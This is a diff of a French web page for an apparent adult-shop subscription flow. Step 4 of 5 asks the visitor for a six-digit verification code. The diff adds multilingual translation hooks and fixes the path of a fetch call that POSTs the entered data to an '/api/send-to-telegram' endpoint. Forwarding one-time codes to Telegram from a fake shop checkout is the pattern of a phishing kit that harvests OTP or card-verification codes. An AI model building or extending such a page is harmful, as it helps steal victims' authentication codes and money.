@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sextoys Boutique - Vérification du code</title>
+    <title data-i18n="verification_title">Vérification du Code</title>
     <style>
         body {
             background-color: #0f1419;
@@ -140,12 +140,13 @@
             100% { opacity: 1; }
         }
     </style>
+    <script src="js/translations.js"></script>
 </head>
-<body>
+<body onload="detectLanguage()">
     <header>
         <div class="logo-container">
-            <h1>Sextoys Boutique</h1>
-            <span>Plaisir & Élégance</span>
+            <h1 data-i18n="title">Boutique Plaisir Intime</h1>
+            <span data-i18n="slogan">Plaisir & Élégance</span>
         </div>
     </header>
     <div class="container">
@@ -156,19 +157,19 @@
             <div class="active">4</div>
             <div>5</div>
         </div>
-        <h2>Vérification du Code</h2>
-        <p>Un code de vérification a été envoyé à votre numéro de téléphone ou à votre adresse e-mail. Veuillez entrer le code ci-dessous.</p>
+        <h2 data-i18n="verification_title">Vérification du Code</h2>
+        <p data-i18n="verification_message">Un code de vérification a été envoyé à votre numéro de téléphone ou à votre adresse e-mail. Veuillez entrer le code ci-dessous.</p>
         
         <div class="input-group">
-            <label for="verification-code">Entrez le code de vérification</label>
-            <input type="text" id="verification-code" name="verification-code" placeholder="123456" maxlength="6" required>
+            <label for="verification-code" data-i18n="code_label">Entrez le code de vérification</label>
+            <input type="text" id="verification-code" name="verification-code" placeholder="123456" data-i18n-placeholder="code_placeholder" maxlength="6" required>
             <div id="code-error" class="error">Le code doit contenir exactement 6 chiffres.</div>
         </div>
 
         <form id="verification-form">
-            <button type="submit">Valider</button>
+            <button type="submit" data-i18n="validate">Valider</button>
         </form>
-        <div id="loading-message">Veuillez patienter, chargement en cours...</div>
+        <div id="loading-message" data-i18n="loading">Veuillez patienter, chargement en cours...</div>
     </div>
     <script>
         // Récupérer les données de subscriptionData
@@ -216,7 +217,7 @@
 
             try {
                 console.log('Envoi au serveur...');
-                const response = await fetch('api/send-to-telegram', {
+                const response = await fetch('/api/send-to-telegram', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
